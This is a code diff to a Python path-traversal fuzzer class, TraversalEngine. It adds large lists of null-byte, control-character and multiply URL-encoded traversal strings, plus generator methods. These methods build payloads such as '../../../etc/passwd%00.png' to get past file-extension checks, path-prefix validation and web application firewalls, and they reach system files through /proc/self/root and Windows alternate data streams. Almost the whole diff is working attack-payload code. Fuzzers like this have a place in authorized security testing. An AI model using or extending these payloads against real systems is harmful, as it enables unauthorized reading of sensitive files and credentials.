@@ -123,8 +123,8 @@ class TraversalEngine:
         # Basic representations
         "..",
         
-        # Null byte variations
-        ".%00.", "..%00", "..%01", 
+        # Null byte variations - CRITICAL for file extension bypass
+        ".%00.", "..%00", "..%01", "..%2500", "..%252500", "..%25252500",
         
         # Wildcard patterns  
         ".?", "??", "?.",
@@ -194,6 +194,13 @@ class TraversalEngine:
         "%e0%80%ae%25252e",  # Invalid UTF-8 + triple URL
         "%252e%c0%ae",       # Double URL + UTF-8 overlong
         "%25252e%e0%80%ae",  # Triple URL + invalid UTF-8
+        
+        # Null byte injection patterns for comprehensive bypass
+        "..%00%2e", "%2e%00%2e", "%2e%2e%00",  # Null byte in different positions
+        "..%c0%80", "%c0%80%c0%80",            # UTF-8 null variations
+        "..%u0000", "%u0000%u0000",            # Unicode null variations
+        "..%01%02", "%02%2e%01",               # Control character variations
+        "..%0a%2e", "%2e%0d%2e",               # Line break character variations
     ]
 
     # Slashes (/ and \\) representations for fuzzing with comprehensive WAF bypass encoding
@@ -266,6 +273,24 @@ class TraversalEngine:
         "%e0%80%af%25252f", # Invalid UTF-8 + triple URL
         "%252f%c0%af",      # Double URL + UTF-8 overlong
         "%25252f%e0%80%af", # Triple URL + invalid UTF-8
+        
+        # Null byte injection patterns for path separator bypass
+        "/%00", "%00/", "%2f%00", "%00%2f",           # Forward slash null variations
+        "\\%00", "%00\\", "%5c%00", "%00%5c",         # Backslash null variations
+        "%2500%2f", "%2f%2500", "%2500%5c", "%5c%2500", # Double encoded null combinations
+        "/%c0%80", "%c0%80/", "\\%c0%80", "%c0%80\\", # UTF-8 null with separators
+        "/%u0000", "%u0000/", "\\%u0000", "%u0000\\", # Unicode null with separators
+        
+        # Control character injection with separators
+        "/%01", "%01/", "/%02", "%02/",               # Control chars with forward slash
+        "\\%01", "%01\\", "\\%02", "%02\\",           # Control chars with backslash
+        "/%0a", "%0a/", "/%0d", "%0d/",               # Line breaks with separators
+        "\\%0a", "%0a\\", "\\%0d", "%0d\\",           # Line breaks with backslash
+        
+        # Space injection with separators (edge cases)
+        "/ ", " /", "\\ ", " \\",                     # Literal spaces
+        "/%20", "%20/", "\\%20", "%20\\",             # URL encoded spaces
+        "%2520%2f", "%2f%2520", "%2520%5c", "%5c%2520", # Double encoded space combinations
     ]
 
     # Special patterns that won't be combined in the main engine to reduce payload count
@@ -302,10 +327,24 @@ class TraversalEngine:
         "..%e0%80%af%252f",         # Invalid UTF-8 + double URL
         "..%e0%80%af%25252f",       # Invalid UTF-8 + triple URL
         
-        # Null byte with multiple encoding levels
-        "..%2500%252f",             # URL encoded null + double encoded slash
-        "..%252500%25252f",         # Double encoded null + triple encoded slash
-        "..%2525252500%2525252f",   # Quadruple encoded null + quintuple encoded slash
+        # Null byte with multiple encoding levels - CRITICAL for file extension bypass
+        "..%00%252f", "..%2500%252f", "..%252500%25252f",     # Various null + encoded slash combinations
+        "..%00%255c", "..%2500%255c", "..%252500%25255c",     # Various null + encoded backslash combinations
+        "..%c0%80%252f", "..%e0%80%80%252f", "..%f0%80%80%80%252f", # UTF-8 null variations
+        "..%u0000%252f", "..%01%252f", "..%02%252f",          # Alternative null/control chars
+        
+        # Multiple null bytes (bypass double-check filters)
+        "..%00%00%2f", "..%2500%2500%252f", "..%00%2500%252f", # Double null combinations
+        "..%00%01%00%2f", "..%00%20%00%2f", "..%2500%20%2500%252f", # Null with padding
+        
+        # Null byte injection in middle of traversal sequence
+        "..%00/%2e%2e/", "..%2500/%252e%252e/", "..%252500/%25252e%25252e/", # Mid-sequence nulls
+        ".%00.%2f.%00.%2f", ".%2500.%252f.%2500.%252f",      # Alternating null pattern
+        
+        # File extension bypass with null byte termination
+        "..%00.png%2f", "..%00.jpg%252f", "..%00.pdf%25252f", # Fake extensions with null
+        "..%2500.txt%252f", "..%252500.log%25252f",           # Double/triple encoded nulls
+        "..%c0%80.backup%252f", "..%e0%80%80.tmp%25252f",     # UTF-8 null with extensions
         
         # Space injection with multiple encoding
         "..%20%252f",               # URL encoded space + double encoded slash
@@ -525,6 +564,19 @@ class TraversalEngine:
                         
                     final_traversals.append(payload)
 
+        # Add null byte bypass patterns with file extension validation bypass
+        if not bisection_depth:  # Skip in bisection mode for efficiency
+            if not self.quiet:
+                print("[+] Creating Null Byte Bypass patterns for file extension validation bypass")
+                
+            null_byte_patterns = self._generate_null_byte_bypass_patterns(
+                os_type, specific_file, extra_files, extension, max_depth
+            )
+            final_traversals.extend(null_byte_patterns)
+            
+            if not self.quiet:
+                print(f"[+] Added {len(null_byte_patterns)} null byte bypass patterns")
+
         # Add direct absolute path injection patterns
         if include_absolute and not bisection_depth:  # Skip absolute paths in bisection mode
             if not self.quiet:
@@ -659,6 +711,207 @@ class TraversalEngine:
         
         return unique_traversals
 
+    def _generate_null_byte_bypass_patterns(
+        self, 
+        os_type: OSType, 
+        specific_file: Optional[str], 
+        extra_files: bool, 
+        extension: Optional[str],
+        max_depth: int
+    ) -> List[str]:
+        """
+        Generate null byte bypass patterns for file extension validation bypass
+        
+        These patterns exploit vulnerabilities where applications validate file extensions
+        but fail to handle null bytes properly. The null byte terminates string processing
+        in many languages (C, PHP, etc.), causing the application to ignore everything
+        after the null byte.
+        
+        Examples:
+        - ../../../etc/passwd%00.png (bypasses .png extension validation)
+        - /var/www/images/../../../etc/passwd%00.jpg (path validation + null byte bypass)
+        - ../../../windows/system32/drivers/etc/hosts%00.txt (Windows equivalent)
+        
+        Args:
+            os_type: Operating system type for intelligent fuzzing
+            specific_file: Specific filename to target
+            extra_files: Include extra files from EXTRA_FILES  
+            extension: File extension that may be validated
+            max_depth: Maximum depth for traversal patterns
+            
+        Returns:
+            List of null byte bypass patterns
+        """
+        patterns = []
+        
+        # Get target files
+        target_files = self._get_target_files(os_type, specific_file, extra_files)
+        
+        # Define common file extensions that applications often validate
+        common_extensions = [
+            '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp', '.svg',  # Images
+            '.pdf', '.doc', '.docx', '.txt', '.rtf', '.odt',           # Documents  
+            '.zip', '.rar', '.tar', '.gz', '.7z',                     # Archives
+            '.mp3', '.wav', '.mp4', '.avi', '.mov',                   # Media
+            '.xml', '.json', '.csv', '.log',                          # Data
+            '.php', '.jsp', '.asp', '.aspx', '.js', '.html',          # Code (sometimes allowed)
+        ]
+        
+        # If extension is provided, prioritize it but also test common ones
+        if extension:
+            if not extension.startswith('.'):
+                extension = '.' + extension
+            test_extensions = [extension] + [ext for ext in common_extensions if ext != extension]
+        else:
+            test_extensions = common_extensions
+        
+        # Null byte representations with comprehensive encoding coverage
+        null_byte_encodings = [
+            '%00',           # Standard URL encoding
+            '%2500',         # Double URL encoding  
+            '%252500',       # Triple URL encoding
+            '%25252500',     # Quadruple URL encoding
+            '%2525252500',   # Quintuple URL encoding
+            '\x00',          # Literal null byte (raw)
+            '%u0000',        # Unicode encoding
+            '%c0%80',        # UTF-8 overlong encoding
+            '%e0%80%80',     # Invalid UTF-8 3-byte sequence
+            '%f0%80%80%80',  # Invalid UTF-8 4-byte sequence
+            '\0',            # Alternative null representation
+            '%01',           # Control character (sometimes works)
+            '%02',           # STX control character
+            '%03',           # ETX control character
+            '%0a',           # Line feed (sometimes terminates)
+            '%0d',           # Carriage return (sometimes terminates)
+            '%09',           # Tab character (edge case)
+            '%20%00',        # Space + null byte
+            '%00%20',        # Null byte + space
+        ]
+        
+        # Generate basic traversal patterns for null byte injection
+        base_traversal_patterns = []
+        
+        # Standard traversal patterns
+        for depth in range(1, max_depth + 1):
+            base_traversal_patterns.extend([
+                '../' * depth,
+                '..\\'  * depth,
+                '%2e%2e%2f' * depth,       # URL encoded
+                '%2e%2e%5c' * depth,       # URL encoded backslash
+                '%252e%252e%252f' * depth, # Double URL encoded
+                '%252e%252e%255c' * depth, # Double URL encoded backslash
+            ])
+        
+        # Add non-recursive bypass patterns
+        base_traversal_patterns.extend([
+            '....//....//....//',
+            '....\\\\....\\\\....\\\\',
+            '..%252f..%252f..%252f',
+            '..%255c..%255c..%255c',
+        ])
+        
+        # Generate comprehensive null byte bypass patterns
+        for traversal_pattern in base_traversal_patterns:
+            for target_file in target_files:
+                for null_encoding in null_byte_encodings:
+                    for fake_extension in test_extensions:
+                        # Pattern: traversal + target_file + null_byte + fake_extension
+                        pattern = f"{traversal_pattern}{target_file}{null_encoding}{fake_extension}"
+                        patterns.append(pattern)
+                        
+                        # Pattern: traversal + target_file + null_byte + multiple_fake_extensions
+                        # Some applications check for multiple extensions
+                        if len(test_extensions) > 1:
+                            multi_ext = fake_extension + '.backup' + fake_extension
+                            pattern_multi = f"{traversal_pattern}{target_file}{null_encoding}{multi_ext}"
+                            patterns.append(pattern_multi)
+                        
+                        # Pattern with additional encoding on the target file
+                        encoded_target = target_file.replace('/', '%2f').replace('\\', '%5c')
+                        if encoded_target != target_file:
+                            pattern_encoded = f"{traversal_pattern}{encoded_target}{null_encoding}{fake_extension}"
+                            patterns.append(pattern_encoded)
+        
+        # Generate path validation bypass + null byte patterns
+        # These combine legitimate path prefixes with null byte bypass
+        legitimate_prefixes = self._get_legitimate_path_prefixes(os_type)
+        
+        # Limit prefixes to prevent payload explosion
+        selected_prefixes = legitimate_prefixes[:10] if len(legitimate_prefixes) > 10 else legitimate_prefixes
+        
+        for prefix in selected_prefixes:
+            for depth in range(2, min(max_depth + 1, 5)):  # Start from depth 2, limit to 4
+                traversal_seq = '../' * depth
+                for target_file in target_files[:5]:  # Limit target files to prevent explosion
+                    clean_target = target_file.lstrip('/').lstrip('\\')
+                    for null_encoding in null_byte_encodings[:8]:  # Limit null encodings
+                        for fake_extension in test_extensions[:6]:  # Limit extensions
+                            # Pattern: prefix + traversal + target + null + extension
+                            pattern = f"{prefix}{traversal_seq}{clean_target}{null_encoding}{fake_extension}"
+                            patterns.append(pattern)
+        
+        # Generate absolute path + null byte patterns
+        absolute_files = self._get_absolute_target_files(os_type, specific_file, extra_files)
+        
+        for abs_file in absolute_files[:15]:  # Limit to prevent explosion
+            for null_encoding in null_byte_encodings[:10]:  # Top null encodings
+                for fake_extension in test_extensions[:8]:  # Top extensions
+                    # Pattern: absolute_path + null_byte + fake_extension
+                    pattern = f"{abs_file}{null_encoding}{fake_extension}"
+                    patterns.append(pattern)
+                    
+                    # Pattern with URL encoding on absolute path
+                    encoded_abs = abs_file.replace('/', '%2f').replace('\\', '%5c').replace(':', '%3a')
+                    if encoded_abs != abs_file:
+                        pattern_encoded = f"{encoded_abs}{null_encoding}{fake_extension}"
+                        patterns.append(pattern_encoded)
+        
+        # Generate special null byte bypass patterns for specific attack scenarios
+        special_null_patterns = []
+        
+        # Multiple null bytes (some parsers only check for single null)
+        for traversal_pattern in base_traversal_patterns[:10]:  # Limit base patterns
+            for target_file in target_files[:5]:  # Limit target files
+                for fake_extension in test_extensions[:5]:  # Limit extensions
+                    special_null_patterns.extend([
+                        f"{traversal_pattern}{target_file}%00%00{fake_extension}",    # Double null
+                        f"{traversal_pattern}{target_file}%00%01%00{fake_extension}", # Null + control + null
+                        f"{traversal_pattern}{target_file}%00.{fake_extension}",     # Null + dot + extension
+                        f"{traversal_pattern}{target_file}.%00{fake_extension}",     # Dot + null + extension
+                        f"{traversal_pattern}{target_file}%00/{fake_extension}",     # Null + slash + extension
+                        f"{traversal_pattern}{target_file}%00\\{fake_extension}",    # Null + backslash + extension
+                        f"{traversal_pattern}{target_file}%2500{fake_extension}",    # Double encoded null
+                        f"{traversal_pattern}{target_file}%252500{fake_extension}",  # Triple encoded null
+                    ])
+        
+        patterns.extend(special_null_patterns)
+        
+        # Generate filename truncation bypass patterns
+        # Some systems truncate long filenames, which can bypass validation
+        long_fake_names = [
+            'A' * 50 + '.png',
+            'B' * 100 + '.jpg', 
+            'C' * 200 + '.pdf',
+            'verylongfilenamethatmightbetcated' * 3 + '.txt',
+        ]
+        
+        for traversal_pattern in base_traversal_patterns[:5]:  # Limit patterns
+            for target_file in target_files[:3]:  # Limit target files
+                for null_encoding in ['%00', '%2500']:  # Main null encodings
+                    for long_name in long_fake_names:
+                        pattern = f"{traversal_pattern}{target_file}{null_encoding}{long_name}"
+                        patterns.append(pattern)
+        
+        # Remove duplicates while preserving order
+        unique_patterns = []
+        seen = set()
+        for pattern in patterns:
+            if pattern not in seen and len(pattern) > 10:  # Filter out too short patterns
+                unique_patterns.append(pattern)
+                seen.add(pattern)
+        
+        return unique_patterns
+
     def _get_target_files(
         self, 
         os_type: OSType, 
@@ -763,6 +1016,12 @@ class TraversalEngine:
                     # Add encoded variations
                     encoded_variations = self._generate_encoded_variations_for_path_validation(pattern)
                     patterns.extend(encoded_variations)
+                    
+                    # Add null byte bypass variations for path validation scenarios
+                    null_byte_variations = self._generate_null_byte_variations_for_path_validation(
+                        prefix, sequence, clean_target, extension
+                    )
+                    patterns.extend(null_byte_variations)
         
         return patterns
 
@@ -1184,6 +1443,117 @@ class TraversalEngine:
         
         return unique_variations
 
+    def _generate_null_byte_variations_for_path_validation(
+        self, 
+        prefix: str, 
+        sequence: str, 
+        target_file: str, 
+        extension: Optional[str]
+    ) -> List[str]:
+        """
+        Generate null byte bypass variations specifically for path validation scenarios
+        
+        These patterns combine legitimate path prefixes with traversal sequences and
+        null byte bypass techniques to evade both path validation and extension validation.
+        
+        Args:
+            prefix: Legitimate path prefix (e.g., '/var/www/images/')
+            sequence: Traversal sequence (e.g., '../../../')
+            target_file: Target file to access (e.g., 'etc/passwd')
+            extension: Optional extension that might be validated
+            
+        Returns:
+            List of null byte bypass variations for path validation
+        """
+        variations = []
+        
+        # Core null byte encodings for path validation bypass
+        null_encodings = [
+            '%00', '%2500', '%252500',  # Standard + double + triple URL encoding
+            '%c0%80', '%e0%80%80',      # UTF-8 overlong encodings
+            '%00%20', '%20%00',         # Null with space variations
+        ]
+        
+        # Common file extensions for validation bypass
+        fake_extensions = ['.png', '.jpg', '.pdf', '.txt', '.log', '.backup']
+        
+        # If extension is provided, prioritize it
+        if extension:
+            if not extension.startswith('.'):
+                extension = '.' + extension
+            test_extensions = [extension] + [ext for ext in fake_extensions if ext != extension]
+        else:
+            test_extensions = fake_extensions
+        
+        # Generate null byte bypass patterns for path validation
+        for null_enc in null_encodings:
+            for fake_ext in test_extensions[:4]:  # Limit to prevent explosion
+                # Basic pattern: prefix + sequence + target + null + fake_extension
+                pattern = f"{prefix}{sequence}{target_file}{null_enc}{fake_ext}"
+                variations.append(pattern)
+                
+                # Pattern with multiple fake extensions
+                multi_ext = fake_ext + '.backup'
+                pattern_multi = f"{prefix}{sequence}{target_file}{null_enc}{multi_ext}"
+                variations.append(pattern_multi)
+                
+                # Pattern with encoded sequence
+                encoded_sequence = sequence.replace('../', '%2e%2e%2f').replace('..\\', '%2e%2e%5c')
+                if encoded_sequence != sequence:
+                    pattern_encoded = f"{prefix}{encoded_sequence}{target_file}{null_enc}{fake_ext}"
+                    variations.append(pattern_encoded)
+                
+                # Pattern with double null bytes (bypass double-check filters)
+                double_null = null_enc + '%00'
+                pattern_double = f"{prefix}{sequence}{target_file}{double_null}{fake_ext}"
+                variations.append(pattern_double)
+                
+                # Pattern with null byte in the middle of filename
+                if '/' in target_file or '\\' in target_file:
+                    # Insert null byte before last path component
+                    parts = target_file.replace('\\', '/').split('/')
+                    if len(parts) > 1:
+                        modified_target = '/'.join(parts[:-1]) + null_enc + '/' + parts[-1]
+                        pattern_mid = f"{prefix}{sequence}{modified_target}{fake_ext}"
+                        variations.append(pattern_mid)
+        
+        # Generate prefix-specific null byte bypass patterns
+        # Target common subdirectory validation scenarios
+        subdirs = ['images', 'uploads', 'files', 'documents', 'media', 'static']
+        
+        for subdir in subdirs:
+            if subdir in prefix.lower():
+                # Pattern that bypasses subdirectory restriction with null byte
+                for null_enc in null_encodings[:3]:  # Limit encodings
+                    for fake_ext in test_extensions[:3]:  # Limit extensions
+                        # Inject null byte after subdirectory name to bypass validation
+                        modified_prefix = prefix.replace(f'{subdir}/', f'{subdir}{null_enc}/')
+                        if modified_prefix != prefix:
+                            pattern = f"{modified_prefix}{sequence}{target_file}{fake_ext}"
+                            variations.append(pattern)
+        
+        # Generate double-encoding combinations for advanced WAF bypass
+        for fake_ext in test_extensions[:2]:  # Limit to prevent explosion
+            # Combine double URL encoding of sequence with null byte bypass
+            double_encoded_seq = sequence.replace('../', '%252e%252e%252f').replace('..\\', '%252e%252e%255c')
+            if double_encoded_seq != sequence:
+                pattern = f"{prefix}{double_encoded_seq}{target_file}%2500{fake_ext}"
+                variations.append(pattern)
+                
+                # Triple encoding combination
+                triple_encoded_seq = sequence.replace('../', '%25252e%25252e%25252f')
+                if triple_encoded_seq != sequence:
+                    pattern_triple = f"{prefix}{triple_encoded_seq}{target_file}%252500{fake_ext}"
+                    variations.append(pattern_triple)
+        
+        # Filter out duplicates and invalid patterns
+        unique_variations = []
+        for var in variations:
+            if var not in unique_variations and len(var) > 15:  # Minimum length check
+                unique_variations.append(var)
+        
+        return unique_variations
+
     def _generate_absolute_patterns(
         self, 
         os_type: OSType, 
@@ -1221,8 +1591,158 @@ class TraversalEngine:
                     if extension:
                         pattern += extension
                     patterns.append(pattern)
+            
+            # Add null byte bypass variations for absolute paths
+            null_byte_variations = self._generate_null_byte_variations_for_absolute_paths(abs_file, extension)
+            patterns.extend(null_byte_variations)
         
         return patterns
+
+    def _generate_null_byte_variations_for_absolute_paths(
+        self, 
+        absolute_file: str, 
+        extension: Optional[str]
+    ) -> List[str]:
+        """
+        Generate null byte bypass variations for absolute path injection
+        
+        These patterns target scenarios where applications accept absolute paths
+        but validate file extensions, allowing null byte bypass to circumvent
+        extension validation while accessing arbitrary files.
+        
+        Args:
+            absolute_file: Absolute path to target file
+            extension: Optional extension that might be validated
+            
+        Returns:
+            List of null byte bypass variations for absolute paths
+        """
+        variations = []
+        
+        # Null byte encodings for absolute path bypass
+        null_encodings = [
+            '%00', '%2500', '%252500', '%25252500',  # Multiple URL encoding levels
+            '%c0%80', '%e0%80%80', '%f0%80%80%80',   # UTF-8 overlong encodings
+            '%u0000',                               # Unicode encoding
+            '%01', '%02', '%0a', '%0d',             # Alternative control characters
+        ]
+        
+        # File extensions for validation bypass
+        fake_extensions = [
+            '.png', '.jpg', '.jpeg', '.gif', '.pdf', '.txt', '.log', 
+            '.xml', '.json', '.csv', '.doc', '.docx', '.zip'
+        ]
+        
+        # If extension provided, prioritize it
+        if extension:
+            if not extension.startswith('.'):
+                extension = '.' + extension
+            test_extensions = [extension] + [ext for ext in fake_extensions if ext != extension]
+        else:
+            test_extensions = fake_extensions
+        
+        # Generate basic null byte bypass patterns
+        for null_enc in null_encodings:
+            for fake_ext in test_extensions[:6]:  # Limit to prevent explosion
+                # Pattern: absolute_path + null_byte + fake_extension
+                pattern = f"{absolute_file}{null_enc}{fake_ext}"
+                variations.append(pattern)
+                
+                # Pattern with multiple fake extensions
+                multi_ext = fake_ext + '.backup'
+                pattern_multi = f"{absolute_file}{null_enc}{multi_ext}"
+                variations.append(pattern_multi)
+                
+                # Pattern with space before null byte (edge case)
+                pattern_space = f"{absolute_file} {null_enc}{fake_ext}"
+                variations.append(pattern_space)
+                
+                # Pattern with double null bytes
+                double_null = null_enc + '%00'
+                pattern_double = f"{absolute_file}{double_null}{fake_ext}"
+                variations.append(pattern_double)
+        
+        # Generate encoded absolute path + null byte combinations
+        encoded_absolute_variations = [
+            absolute_file.replace('/', '%2f').replace('\\', '%5c').replace(':', '%3a'),  # Full URL encoding
+            absolute_file.replace('/', '%252f').replace('\\', '%255c').replace(':', '%253a'),  # Double encoding
+            absolute_file.replace('C:', 'c:').lower(),  # Case variation for Windows
+            absolute_file.upper(),  # Full uppercase
+        ]
+        
+        for encoded_abs in encoded_absolute_variations:
+            if encoded_abs != absolute_file:  # Avoid duplicates
+                for null_enc in null_encodings[:4]:  # Limit null encodings
+                    for fake_ext in test_extensions[:4]:  # Limit extensions
+                        pattern = f"{encoded_abs}{null_enc}{fake_ext}"
+                        variations.append(pattern)
+        
+        # Generate path component null byte injection
+        # Inject null bytes in different parts of the path
+        path_parts = absolute_file.replace('\\', '/').split('/')
+        if len(path_parts) > 2:  # Need at least drive/root + directory + file
+            for i in range(1, len(path_parts)):  # Skip root/drive part
+                for null_enc in ['%00', '%2500']:  # Main null encodings
+                    for fake_ext in test_extensions[:3]:  # Limit extensions
+                        # Inject null byte after path component
+                        modified_parts = path_parts.copy()
+                        modified_parts[i] = modified_parts[i] + null_enc
+                        modified_path = '/'.join(modified_parts)
+                        
+                        # Restore original separators if it was Windows path
+                        if '\\' in absolute_file:
+                            modified_path = modified_path.replace('/', '\\')
+                        
+                        pattern = f"{modified_path}{fake_ext}"
+                        variations.append(pattern)
+        
+        # Generate filename truncation bypass patterns
+        # Some systems truncate long paths, which can bypass validation
+        long_fake_extensions = [
+            '.verylongextensionnamethatmightbetcated',
+            '.png' + 'A' * 50,
+            '.txt' + 'B' * 100,
+        ]
+        
+        for null_enc in ['%00', '%2500']:  # Main null encodings
+            for long_ext in long_fake_extensions:
+                pattern = f"{absolute_file}{null_enc}{long_ext}"
+                variations.append(pattern)
+        
+        # Generate Windows-specific null byte bypass patterns
+        if absolute_file.startswith('C:') or '\\' in absolute_file:
+            # Windows alternate data streams with null byte
+            for null_enc in ['%00', '%2500']:
+                for fake_ext in test_extensions[:3]:
+                    pattern = f"{absolute_file}:{null_enc}:$DATA{fake_ext}"
+                    variations.append(pattern)
+                    
+                    # Pattern with stream name
+                    pattern_stream = f"{absolute_file}:stream{null_enc}{fake_ext}"
+                    variations.append(pattern_stream)
+        
+        # Generate Unix-specific null byte bypass patterns  
+        if absolute_file.startswith('/'):
+            # Unix symbolic link traversal with null byte
+            for null_enc in ['%00', '%2500']:
+                for fake_ext in test_extensions[:3]:
+                    # Pattern targeting common symlink locations
+                    pattern = f"/proc/self/root{absolute_file}{null_enc}{fake_ext}"
+                    variations.append(pattern)
+                    
+                    # Pattern with /proc/self/cwd traversal
+                    pattern_cwd = f"/proc/self/cwd{absolute_file}{null_enc}{fake_ext}"
+                    variations.append(pattern_cwd)
+        
+        # Filter out duplicates and invalid patterns
+        unique_variations = []
+        seen = set()
+        for var in variations:
+            if var not in seen and len(var) > 10:  # Minimum length check
+                unique_variations.append(var)
+                seen.add(var)
+        
+        return unique_variations
 
     def _get_absolute_target_files(
         self, 
